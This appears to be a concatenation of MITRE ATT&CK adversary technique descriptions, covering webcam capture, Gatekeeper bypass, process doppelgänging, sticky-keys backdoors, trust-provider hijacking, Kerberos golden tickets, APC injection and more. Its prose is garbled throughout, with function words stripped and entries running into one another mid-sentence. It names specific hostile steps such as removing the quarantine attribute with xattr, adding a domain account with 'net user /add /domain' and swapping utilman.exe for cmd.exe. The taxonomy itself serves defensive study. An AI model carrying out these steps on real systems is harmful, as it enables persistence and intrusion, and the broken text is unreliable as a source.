Adversaries gather ways, direct elicitation [Phishing Information](https://attack.mitre.org/techniques/T1598). business relationships exposed adversaries online accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering reveal opportunities forms reconnaissance (ex: [Phishing Information](https://attack.mitre.org/techniques/T1598) [Search Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195), [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), [Trusted Relationship](https://attack.mitre.org/techniques/T1199)). adversary leverage computer's peripheral devices integrated cameras webcams) applications video services) capture video recordings purpose gathering information. Images captured devices applications, intervals, lieu video files.

Malware scripts interact devices API operating application capture video images. Video image files written disk exfiltrated later. technique differs [Screen Capture](https://attack.mitre.org/techniques/T1113) specific devices applications video recording capturing victim's screen.

In macOS, malware samples record user's webcam FruitFly Proton. (Citation: objective-see 2017 review) macOS OS X, applications programs downloaded internet, special attribute set file called <code>com.apple.quarantine</code>. attribute read Apple's Gatekeeper defense program execution time prompt user deny execution. 

Apps loaded USB flash drive, optical disk, external hard drive, drive shared local network won’t set flag. Additionally, utilities events drive-by downloads don’t set either. completely bypasses built-in Gatekeeper check. (Citation: Methods Mac Malware Persistence) presence quarantine flag checked xattr command <code>xattr /path/to/MyApp.app</code> <code>com.apple.quarantine</code>. Similarly, sudo access elevated permission, attribute removed xattr well, <code>sudo xattr -r -d com.apple.quarantine /path/to/MyApp.app</code>. (Citation: Clearing quarantine attribute) (Citation: OceanLotus OS X)
 
In typical operation, file downloaded internet quarantine flag saved disk. user file application, macOS’s gatekeeper step check presence flag. exists, macOS prompt user confirmation program provide URL application from. However, based file downloaded quarantine-savvy application. (Citation: Bypassing Gatekeeper) Software packing method compressing encrypting executable. Packing executable file signature attempt avoid signature-based detection. decompression techniques decompress executable code memory.

Utilities perform software packing called packers. packers MPRESS UPX. comprehensive list packers available, (Citation: Wikipedia Exe Compression) adversaries create packing techniques leave artifacts well-known packers evade defenses.

Adversaries virtual machine software protection form software packing protect code. Virtual machine software protection translates executable's original code special format special virtual machine run. virtual machine called code.(Citation: ESET FinFisher Jan 2018) Adversaries inject malicious code process process doppelgänging evade process-based defenses elevate privileges. Process doppelgänging method executing arbitrary code address space separate live process. 

Windows Transactional NTFS (TxF) introduced Vista method perform safe file operations. (Citation: TxF) ensure data integrity, TxF enables transacted handle write file time. write handle transaction terminated, handles isolated writer read committed version file existed time handle opened. (Citation: Basic TxF Concepts) avoid corruption, TxF performs automatic rollback application fails write transaction. (Citation: TxF)

Although deprecated, TxF application programming interface (API) enabled Windows 10. (Citation: BlackHat Process Doppelgänging Dec 2017)

Adversaries abuse TxF perform file-less variation [Process Injection](https://attack.mitre.org/techniques/T1055). [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), process doppelgänging involves replacing memory legitimate process, enabling veiled execution malicious code evade defenses detection. Process doppelgänging's TxF avoids highly-monitored API functions <code>NtUnmapViewOfSection</code>, <code>VirtualProtectEx</code>, <code>SetThreadContext</code>. (Citation: BlackHat Process Doppelgänging Dec 2017)

Process Doppelgänging implemented 4 steps (Citation: BlackHat Process Doppelgänging Dec 2017):

* Transact – Create TxF transaction legitimate executable overwrite file malicious code. isolated visible context transaction.
* Load – Create shared memory load malicious executable.
* Rollback – Undo original executable, effectively removing malicious code file system.
* Animate – Create process tainted memory initiate execution.

This behavior result elevated privileges injected process spawned (and inherits security context) injecting process. However, execution process doppelgänging evade detection security products execution masked legitimate process.  Adversaries details network configuration settings, IP MAC addresses, systems access discovery remote systems. operating administration utilities exist gather information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), [route](https://attack.mitre.org/software/S0103).

Adversaries leverage [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) network devices gather configurations settings, IP addresses configured interfaces static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).(Citation: US-CERT-TA18-106A)(Citation: Mandiant APT41 Global Intrusion )

Adversaries [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) automated discovery shape follow-on behaviors, including determining access target network actions next.  adversary delete cloud instance performed malicious activities attempt evade detection remove evidence presence.  Deleting instance virtual machine remove valuable forensic artifacts evidence suspicious behavior instance recoverable.

An adversary [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) terminate instance achieving objectives.(Citation: Mandiant M-Trends 2020) Adversaries search public code repositories victims targeting. Victims store code repositories third-party websites GitHub, GitLab, SourceForge, BitBucket. Users typically interact code repositories application command-line utilities git.  

Adversaries search public code repositories victim. Public code repositories source victims, commonly programming languages libraries names employees. Adversaries identify sensitive data, including accidentally leaked credentials API keys.(Citation: GitHub Cloud Service Credentials) sources reveal opportunities forms reconnaissance (ex: [Phishing Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586) [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), initial access (ex: [Valid Accounts](https://attack.mitre.org/techniques/T1078) [Phishing](https://attack.mitre.org/techniques/T1566)). 

**Note:** distinct [Code Repositories](https://attack.mitre.org/techniques/T1213/003), focuses [Collection](https://attack.mitre.org/tactics/TA0009) private internally hosted code repositories.  Adversaries execute malicious payloads hijacking binaries installer. processes automatically execute specific binaries functionality perform actions. permissions file directory target binary, permissions binary itself, improperly set, target binary overwritten binary user-level permissions executed original process. original process thread running permissions level, replaced binary execute higher-level permissions, include SYSTEM.

Another variation technique performed advantage weakness common executable, self-extracting installers. installation process, common installers subdirectory <code>%TEMP%</code> directory unpack binaries DLLs, EXEs, payloads. installers create subdirectories files set permissions restrict write access, execution untrusted code subdirectories overwriting binaries installation process. behavior advantage [DLL Search Hijacking](https://attack.mitre.org/techniques/T1574/001).

Adversaries technique replace legitimate binaries malicious executing code permissions level. installers require elevated privileges result privilege escalation executing adversary controlled code. behavior [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002). examples weakness existing common installers reported software vendors.(Citation: mozilla_sec_adv_2012)  (Citation: Executable Installers Vulnerable) executing process set specific time event bootup) technique persistence. Adversaries establish persistence elevate privileges executing malicious content triggered accessibility features. Windows accessibility features launched key combination user logged (ex: user Windows logon screen). adversary modify programs launched command prompt backdoor logging system.

Two common accessibility programs <code>C:\Windows\System32\sethc.exe</code>, launched shift key pressed times <code>C:\Windows\System32\utilman.exe</code>, launched Windows + key combination pressed. sethc.exe program referred "sticky keys", adversaries unauthenticated access remote desktop login screen. (Citation: FireEye Hikit Rootkit)

Depending version Windows, adversary advantage features ways. Common methods adversaries include replacing accessibility feature binaries pointers/references binaries Registry. versions Windows, replaced binary digitally signed x64 systems, binary reside <code>%systemdir%\</code>, protected Windows File Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012) debugger method discovered potential workaround require accessibility feature binary replaced.

For simple binary replacement Windows XP Windows Server 2003/R2 later, example, program <code>C:\Windows\System32\utilman.exe</code>) replaced "cmd.exe" (or program backdoor access). Subsequently, pressing key combination login screen sitting keyboard connected [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) replaced file executed privileges. (Citation: Tilbury 2014)

Other accessibility features exist leveraged fashion: (Citation: DEFCON2016 Sticky Keys)(Citation: Narrator Accessibility Abuse)

* On-Screen Keyboard: <code>C:\Windows\System32\osk.exe</code>
* Magnifier: <code>C:\Windows\System32\Magnify.exe</code>
* Narrator: <code>C:\Windows\System32\Narrator.exe</code>
* Display Switcher: <code>C:\Windows\System32\DisplaySwitch.exe</code>
* App Switcher: <code>C:\Windows\System32\AtBroker.exe</code> Adversaries gain persistence elevate privileges situations abusing [PowerShell](https://attack.mitre.org/techniques/T1086) profiles. PowerShell profile  (<code>profile.ps1</code>) script runs PowerShell starts logon script customize user environments. PowerShell supports profiles depending user host program. example, profiles PowerShell host programs PowerShell console, PowerShell ISE Visual Studio Code. administrator configure profile applies users host programs local computer. (Citation: Profiles) 

Adversaries modify profiles include arbitrary commands, functions, modules, PowerShell drives gain persistence. time user PowerShell session modified script executed <code>-NoProfile</code> flag launched. (Citation: ESET Turla PowerShell 2019) 

An adversary escalate privileges script PowerShell profile loaded executed account privileges, domain administrator. (Citation: Wits Shady PowerShell Profiles) user mode, Windows Authenticode (Citation: Authenticode) digital signatures verify file's origin integrity, variables establish trust signed code (ex: driver valid signature handled safe). signature validation process handled WinVerifyTrust application programming interface (API) function,  (Citation: WinVerifyTrust) accepts inquiry coordinates trust provider, responsible validating parameters signature. (Citation: SpectorOps Subverting Trust Sept 2017)

Because varying executable file types signature formats, created software components called Subject Interface Packages (SIPs) (Citation: EduardosBlog SIPs July 2008) provide layer abstraction API functions files. SIPs responsible enabling API functions create, retrieve, calculate, verify signatures. Unique SIPs exist file formats (Executable, PowerShell, Installer, etc., catalog signing providing catch-all  (Citation: Catalog Files Signatures April 2017)) identified globally unique identifiers (GUIDs). (Citation: SpectorOps Subverting Trust Sept 2017)

Similar [Code Signing](https://attack.mitre.org/techniques/T1116), adversaries abuse architecture subvert trust controls bypass security policies legitimately signed code execute system. Adversaries hijack SIP trust provider components mislead operating whitelisting tools classify malicious (or any) code signed by: (Citation: SpectorOps Subverting Trust Sept 2017)

* Modifying <code>Dll</code> <code>FuncName</code> Registry values <code>HKLM\SOFTWARE[\WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{SIP_GUID}</code> dynamic link library (DLL) providing SIP’s CryptSIPDllGetSignedDataMsg function, retrieves encoded digital certificate signed file. maliciously-crafted DLL exported function returns signature (ex: signature Portable Executables) file’s real signature, adversary apply acceptable signature files SIP (Citation: GitHub SIP POC Sept 2017) (although hash mismatch occur, invalidating signature, hash returned function match computed file).
* Modifying <code>Dll</code> <code>FuncName</code> Registry values <code>HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{SIP_GUID}</code> DLL providing SIP’s CryptSIPDllVerifyIndirectData function, validates file’s computed hash signed hash value. maliciously-crafted DLL exported function returns TRUE (indicating validation successful), adversary validate file (with legitimate signature) SIP (Citation: GitHub SIP POC Sept 2017) (with hijacking mentioned CryptSIPDllGetSignedDataMsg function). Registry redirected suitable exported function DLL, avoiding requirement drop execute file disk.
* Modifying <code>DLL</code> <code>Function</code> Registry values <code>HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\Providers\Trust\FinalPolicy\{trust provider GUID}</code> DLL providing trust provider’s FinalPolicy function, decoded parsed signature checked majority trust decisions made. hijacking SIP’s CryptSIPDllVerifyIndirectData function, redirected suitable exported function DLL maliciously-crafted DLL (though implementation trust provider complex).
* **Note:** hijacks modifying Registry [DLL Search Hijacking](https://attack.mitre.org/techniques/T1038).

Hijacking SIP trust provider components enable persistent code execution, malicious components invoked application performs code signing signature validation. (Citation: SpectorOps Subverting Trust Sept 2017) Adversaries attempt listing accounts environment. adversaries determine accounts exist aid follow-on behavior. Adversaries connection proxy direct network traffic systems intermediary network communications command control server avoid direct connections infrastructure. tools exist enable traffic redirection proxies port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries types proxies manage command control communications, reduce simultaneous outbound network connections, provide resiliency connection loss, ride existing trusted communications paths victims avoid suspicion. Adversaries chain multiple proxies disguise source malicious traffic.

Adversaries advantage routing schemes Content Delivery Networks (CDNs) proxy command control traffic. Adversaries abuse command script interpreters execute commands, scripts, binaries. interfaces languages provide interacting systems common feature platforms. systems built-in command-line interface scripting capabilities, example, macOS Linux distributions include flavor [Unix Shell](https://attack.mitre.org/techniques/T1059/004) Windows installations include [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) [PowerShell](https://attack.mitre.org/techniques/T1059/001).

There cross-platform interpreters [Python](https://attack.mitre.org/techniques/T1059/006), commonly client applications [JavaScript](https://attack.mitre.org/techniques/T1059/007) [Visual Basic](https://attack.mitre.org/techniques/T1059/005).

Adversaries abuse technologies executing arbitrary commands. Commands scripts embedded [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered victims lure documents secondary payloads downloaded existing C2. Adversaries execute commands interactive terminals/shells, utilize [Remote Services](https://attack.mitre.org/techniques/T1021) achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Execution Python) adversary attempt block indicators events typically captured sensors gathered analyzed. include maliciously redirecting (Citation: Lamin Sept 2017) disabling host-based sensors, Event Tracing Windows (ETW),(Citation: Event Tracing 2018) tampering settings control collection flow event telemetry. (Citation: Medium Event Tracing Tampering 2018) settings stored configuration files Registry accessible administrative utilities [PowerShell](https://attack.mitre.org/techniques/T1059/001) [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).

ETW interruption achieved multiple ways, defining conditions [PowerShell](https://attack.mitre.org/techniques/T1059/001) <code>Set-EtwTraceProvider</code> cmdlet interfacing Registry alterations.

In network-based reporting indicators, adversary block traffic reporting prevent central analysis. accomplished means, stopping local process responsible forwarding telemetry creating host-based firewall rule block traffic specific hosts responsible aggregating events, security event management (SIEM) products.

In Linux environments, adversaries disable reconfigure log processing tools syslog nxlog inhibit detection monitoring capabilities facilitate follow behaviors (Citation: LemonDuck). Adversaries create domain account maintain access victim systems. Domain accounts managed Active Directory Domain Services access permissions configured systems services domain. Domain accounts cover user, administrator, service accounts. sufficient level access, <code>net user /add /domain</code> command create domain account.

Such accounts establish secondary credentialed access require persistent remote access tools deployed system. Adversaries gather employee names targeting. Employee names derive email addresses guide reconnaissance efforts craft more-believable lures.

Adversaries easily gather employee names, exposed online accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: OPM Leak) Gathering reveal opportunities forms reconnaissance (ex: [Search Websites/Domains](https://attack.mitre.org/techniques/T1593) [Phishing Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) [Valid Accounts](https://attack.mitre.org/techniques/T1078)). Adversaries attempt gather domain trust relationships identify lateral movement opportunities Windows multi-domain/forest environments. Domain trusts provide mechanism domain access resources based authentication procedures domain.(Citation: Trusts) Domain trusts users trusted domain access resources trusting domain. discovered adversary conduct [SID-History Injection](https://attack.mitre.org/techniques/T1134/005), [Pass Ticket](https://attack.mitre.org/techniques/T1550/003), [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).(Citation: AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts enumerated `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, LDAP.(Citation: Harmj0y Domain Trusts) Windows utility [Nltest](https://attack.mitre.org/software/S0359) adversaries enumerate domain trusts.(Citation: Operation Wilysupply) Adversaries KRBTGT account password hash forge Kerberos ticket-granting tickets (TGT), golden ticket.(Citation: AdSecurity Kerberos Aug 2015) Golden tickets enable adversaries generate authentication material account Active Directory.(Citation: CERT-EU Golden Ticket Protection) 

Using golden ticket, adversaries request ticket granting service (TGS) tickets, enable access specific resources. Golden tickets require adversaries interact Key Distribution Center (KDC) TGS.(Citation: ADSecurity Detecting Forged Tickets)

The KDC service runs domain controllers Active Directory domain. KRBTGT Kerberos Key Distribution Center (KDC) service account responsible encrypting signing Kerberos tickets.(Citation: ADSecurity Kerberos KRBTGT) KRBTGT password hash [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) privileged access domain controller. **This technique deprecated. [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) [Component Object Model](https://attack.mitre.org/techniques/T1559/001).**

Adversaries Windows Component Object Model (COM) Distributed Component Object Model (DCOM) local code execution execute remote systems lateral movement. 

COM component native Windows application programming interface (API) enables interaction software objects, executable code implements interfaces.(Citation: Fireeye Hunting June 2019) COM, client object methods server objects, typically Dynamic Link Libraries (DLL) executables (EXE).(Citation: COM) DCOM transparent middleware extends functionality Component Object Model (COM) (Citation: COM) local remote procedure (RPC) technology.(Citation: Fireeye Hunting June 2019)

Permissions interact local remote server objects access control lists (ACL) Registry. (Citation: ACL)(Citation: Process Wide Keys)(Citation: Wide Keys) default, Administrators remotely activate launch objects DCOM.

Adversaries abuse local command payload execution. interfaces exposed abused invoke arbitrary execution variety programming languages C, C++, Java, VBScript.(Citation: COM) Specific objects exists perform functions code execution, creating [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), fileless download/execution, adversary behaviors Privilege Escalation Persistence.(Citation: Fireeye Hunting June 2019)(Citation: ProjectZero File Write EoP Apr 2018)

Adversaries DCOM lateral movement. DCOM, adversaries operating context appropriately privileged user remotely arbitrary direct shellcode execution Office applications (Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) Windows objects insecure methods.(Citation: Enigma MMC20 Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM execute macros existing documents (Citation: Enigma Excel DCOM Sept 2017) invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1173) (DDE) execution created instance Office application (Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing malicious document. Adversaries exfiltrate data, sensitive documents, automated processing gathered Collection. 

When automated exfiltration used, exfiltration techniques apply transfer network, [Exfiltration C2 Channel](https://attack.mitre.org/techniques/T1041) [Exfiltration Alternative Protocol](https://attack.mitre.org/techniques/T1048). Adversaries gather victim's client configurations targeting. client configurations include variety details settings, including operating system/version, virtualization, architecture (ex: 32 64 bit), language, time zone.

Adversaries gather ways, direct collection actions [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: listening ports, server banners, user agent strings) [Phishing Information](https://attack.mitre.org/techniques/T1598). Adversaries compromise sites include malicious content designed collect host visitors.(Citation: ATT ScanBox) client configurations exposed adversaries online accessible data sets (ex: job postings, network maps, assessment reports, resumes, purchase invoices). Gathering reveal opportunities forms reconnaissance (ex: [Search Websites/Domains](https://attack.mitre.org/techniques/T1593) [Search Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) [External Remote Services](https://attack.mitre.org/techniques/T1133)). Adversaries disable modify firewall cloud environment bypass controls limit access cloud resources. Cloud firewalls separate firewalls [Disable Modify Firewall](https://attack.mitre.org/techniques/T1562/004). 

Cloud environments typically utilize restrictive security firewall rules network activity trusted IP addresses expected ports protocols. adversary introduce firewall rules policies access victim cloud environment. example, adversary script utility creates ingress rules existing security TCP/IP connectivity.(Citation: Expel Evil AWS)

Modifying disabling cloud firewall enable adversary C2 communications, lateral movement, data exfiltration allowed. Adversaries abuse right-to-left override (RTLO RLO) character (U+202E) disguise string file benign. RTLO non-printing Unicode character displayed reverse. example, Windows screensaver executable named <code>March 25 \u202Excod.scr</code> display <code>March 25 rcs.docx</code>. JavaScript file named <code>photo_high_re\u202Egnp.js</code> displayed <code>photo_high_resj.png</code>.(Citation: Infosecinstitute RTLO Technique)

Adversaries abuse RTLO character tricking user executing benign file type. common technique [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)/[Malicious File](https://attack.mitre.org/techniques/T1204/002) trick users defenders aware tools display render RTLO character. RTLO character targeted intrusion attempts criminal activity.(Citation: Trend Micro PLEAD RTLO)(Citation: Kaspersky RTLO Cyber Crime) RTLO Windows Registry well, regedit.exe displays reversed characters command tool reg.exe default. Adversaries buy, steal, download malware targeting. Malicious software include payloads, droppers, post-compromise tools, backdoors, packers, C2 protocols. Adversaries acquire malware support operations, obtaining maintaining control remote machines, evading defenses, executing post-compromise behaviors.

In addition downloading malware internet, adversaries purchase capabilities third-party entities. Third-party entities include technology companies specialize malware development, criminal marketplaces (including Malware-as-a-Service, MaaS), individuals. addition purchasing malware, adversaries steal repurpose malware third-party entities (including adversaries). Adversaries modify component firmware persist systems. adversaries employ sophisticated compromise components install malicious firmware execute adversary code operating main firmware BIOS. technique [System Firmware](https://attack.mitre.org/techniques/T1542/001) conducted components/devices capability level integrity checking.

Malicious component firmware provide persistent level access systems potential typical failures maintain access hard disk re-images, evade host software-based defenses integrity checks. Adversaries delete modify artifacts generated systems remove evidence presence hinder defenses. artifacts created adversary attributed adversary’s actions. Typically artifacts defensive indicators monitored events, strings downloaded files, logs generated user actions, data analyzed defenders. Location, format, type artifact (such command login history) specific platform.

Removal indicators interfere event collection, reporting, processes detect intrusion activity. compromise integrity security solutions causing notable events unreported. activity impede forensic analysis incident response, lack sufficient data determine occurred. Adversaries steal data exfiltrating symmetrically encrypted network protocol existing command control channel. data alternate network location main command control server. 

Symmetric encryption algorithms shared keys/secrets channel. requires exchange pre-arranged agreement/possession encrypt decrypt data. 

Network protocols asymmetric encryption utilize symmetric encryption exchanged, adversaries opt manually share implement symmetric cryptographic algorithms (ex: RC4, AES) vice mechanisms baked protocol. result multiple layers encryption (in protocols natively encrypted HTTPS) encryption protocols typically encrypted (such FTP).  Adversaries abuse Office templates persistence compromised system. Office templates common Office applications customize styles. base templates application time application starts. (Citation: Change Normal Template)

Office Visual Basic Applications (VBA) macros (Citation: MSDN VBA Office) inserted base template execute code respective Office application starts persistence. Examples Word Excel discovered published. default, Word Normal.dotm template created modified include malicious macro. Excel template file created default, automatically loaded.(Citation: enigma0x3 normal.dotm)(Citation: Hexacorn Office Template Macros) Shared templates stored pulled remote locations.(Citation: GlobalDotName Jun 2019) 

Word Normal.dotm location:<br>
<code>C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Templates\Normal.dotm</code>

Excel Personal.xlsb location:<br>
<code>C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Excel\XLSTART\PERSONAL.XLSB</code>

Adversaries change location base template hijacking application's search order, e.g. Word 2016 Normal.dotm <code>C:\Program Files (x86)\Microsoft Office\root\Office16\</code>, modifying GlobalDotName registry key. modifying GlobalDotName registry key adversary arbitrary location, file name, file extension template loaded application startup. abuse GlobalDotName, adversaries register template trusted document trusted location.(Citation: GlobalDotName Jun 2019) 

An adversary enable macros execute unrestricted depending enterprise security policy macros. Adversaries rent Virtual Private Servers (VPSs) that targeting. exist variety cloud service providers sell virtual machines/containers service. utilizing VPS, adversaries difficult physically tie operations them. cloud infrastructure easier adversaries rapidly provision, modify, shut infrastructure.

Acquiring VPS stages adversary lifecycle, Command Control, adversaries benefit ubiquity trust reputation cloud service providers. Adversaries acquire infrastructure VPS service providers renting VPSs minimal registration information, allowing anonymous acquisitions infrastructure.(Citation: TrendmicroHideoutsLease) 
Adversaries leverage Confluence repositories valuable information. development environments Atlassian JIRA, Confluence store development-related documentation, however, diverse categories information, as:

* Policies, procedures, standards
* Physical / logical network diagrams
* architecture diagrams
* Technical documentation
* Testing / development credentials
* / project schedules
* Source code snippets
* Links network shares internal resources
 Adversaries “pass ticket” stolen Kerberos tickets laterally environment, bypassing normal access controls. Pass ticket (PtT) method authenticating Kerberos tickets access account's password. Kerberos authentication step lateral movement remote system.

When preforming PtT, valid Kerberos tickets [Valid Accounts](https://attack.mitre.org/techniques/T1078) captured [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). user's service tickets ticket granting ticket (TGT) obtained, depending level access. service ticket access resource, TGT request service tickets Ticket Granting Service (TGS) access resource user privileges access.(Citation: ADSecurity Kerberos Attacks)(Citation: GentilKiwi Pass Ticket)

A [Silver Ticket](https://attack.mitre.org/techniques/T1558/002) services Kerberos authentication mechanism generate tickets access resource hosts resource SharePoint).(Citation: ADSecurity Kerberos Attacks)

A [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) domain Key Distribution Service account KRBTGT account NTLM hash, enables generation TGTs account Active Directory.(Citation: Campbell 2014)

Adversaries create valid Kerberos ticket user information, stolen password hashes AES keys. example, "overpassing hash" involves NTLM password hash authenticate user [Pass Hash](https://attack.mitre.org/techniques/T1550/002)) password hash create valid Kerberos ticket.(Citation: Stealthbits Overpass-the-Hash) Adversaries abuse container administration service execute commands container. container administration service Docker daemon, Kubernetes API server, kubelet remote management containers environment.(Citation: Docker Daemon CLI)(Citation: Kubernetes API)(Citation: Kubernetes Kubelet)

In Docker, adversaries entrypoint container deployment executes script command, command <code>docker exec</code> execute command running container.(Citation: Docker Entrypoint)(Citation: Docker Exec) Kubernetes, adversary sufficient permissions, gain remote execution container cluster interaction Kubernetes API server, kubelet, running command <code>kubectl exec</code>.(Citation: Kubectl Exec Shell) Adversaries enumerate files directories search specific locations host network share file system. Adversaries [File Directory Discovery](https://attack.mitre.org/techniques/T1083) automated discovery shape follow-on behaviors, including adversary infects target attempts specific actions.

Many command utilities information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, <code>locate</code>.(Citation: Windows Commands JPCERT) Custom tools gather file directory interact [Native API](https://attack.mitre.org/techniques/T1106). Adversaries leverage [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) network devices gather file directory (e.g. <code>dir</code>, <code>show flash</code>, <code>nvram</code>).(Citation: US-CERT-TA18-106A) Adversaries dynamically establish connections command control infrastructure evade common detections remediations. achieved malware shares common algorithm infrastructure adversary receive malware's communications. calculations dynamically adjust parameters domain name, IP address, port malware command control.

Adversaries dynamic resolution purpose [Fallback Channels](https://attack.mitre.org/techniques/T1008). contact lost primary command control server malware employ dynamic resolution reestablishing command control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity) Adversaries attempt manipulate task service legitimate benign. Tasks/services executed Task Scheduler systemd typically description.(Citation: TechNet Schtasks)(Citation: Systemd Service Units) Windows services service display name. benign tasks services exist commonly names. Adversaries tasks services names identical legitimate ones.

Tasks services fields, description, adversaries attempt legitimate.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Fysbis Dr Analysis) Adversaries inject malicious code processes asynchronous procedure (APC) queue evade process-based defenses elevate privileges. APC injection method executing arbitrary code address space separate live process. 

APC injection commonly performed attaching malicious code APC Queue (Citation: APC) process's thread. Queued APC functions executed thread enters alterable state.(Citation: APC) handle existing victim process created native Windows API calls <code>OpenThread</code>. <code>QueueUserAPC</code> invoke function (such <code>LoadLibrayA</code> malicious DLL). 

A variation APC injection, dubbed "Early Bird injection", involves creating suspended process malicious code written executed process' entry (and subsequent anti-malware hooks) APC. (Citation: CyberBit Bird Apr 2018) AtomBombing (Citation: ENSIL AtomBombing Oct 2016) variation utilizes APCs invoke malicious code written global atom table.(Citation: Atom Table)

Running code context process access process's memory, system/network resources, elevated privileges. Execution APC injection evade detection security products execution masked legitimate process.  Adversaries leverage traffic mirroring automate data exfiltration compromised network infrastructure.  Traffic mirroring native feature network devices network analysis configured duplicate traffic destinations analysis network analyzer monitoring device. (Citation: Cisco Traffic Mirroring)(Citation: Juniper Traffic Mirroring)

Adversaries abuse traffic mirroring mirror redirect network traffic network infrastructure control. Malicious modifications network devices enable traffic redirection [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) [Patch Image](https://attack.mitre.org/techniques/T1601/001).(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks) Adversaries traffic duplication conjunction [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Input Capture](https://attack.mitre.org/techniques/T1056), [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) depending goals objectives adversary. Windows Application Compatibility Infrastructure/Framework (Application Shim) created compatibility software operating codebase time. example, application shimming feature developers apply fixes applications (without rewriting code) created Windows XP Windows 10. (Citation: Elastic Process Injection July 2017) framework, shims created buffer program (or specifically, Import Address Table) Windows OS. program executed, shim cache referenced determine program requires shim database (.sdb). so, shim database [Hooking](https://attack.mitre.org/techniques/T1179) redirect code communicate OS. 

A list shims installed default Windows installer (sdbinst.exe) in:

* <code>%WINDIR%\AppPatch\sysmain.sdb</code>
* <code>hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb</code>

Custom databases stored in:

* <code>%WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom</code>
* <code>hklm\software\microsoft\windows nt\currentversion\appcompatflags\custom</code>

To shims secure, Windows designed user mode modify kernel administrator privileges install shim. However, shims [Bypass User Account Control](https://attack.mitre.org/techniques/T1088) (UAC) (RedirectEXE), inject DLLs processes (InjectDLL), disable Data Execution Prevention (DisableNX) Structure Exception Handling (DisableSEH), intercept memory addresses (GetProcAddress). [Hooking](https://attack.mitre.org/techniques/T1179), utilizing shims adversary perform malicious acts elevate privileges, install backdoors, disable defenses Windows Defender, etc. Adversaries modify property list files (plist files) enable malicious activity, evading bypassing defenses. macOS applications plist files, <code>info.plist</code> file, store properties configuration settings inform operating handle application runtime. Plist files structured metadata key-value pairs formatted XML based Apple's Core Foundation DTD. Plist files saved binary format.(Citation: fileinfo plist file description) 

Adversaries modify key-value pairs plist files influence behaviors, hiding execution application [Hidden Window](https://attack.mitre.org/techniques/T1564/003)) running additional commands persistence (ex: [Launch Agent](https://attack.mitre.org/techniques/T1543/001)/[Launch Daemon](https://attack.mitre.org/techniques/T1543/004) [Re-opened Applications](https://attack.mitre.org/techniques/T1547/007)).

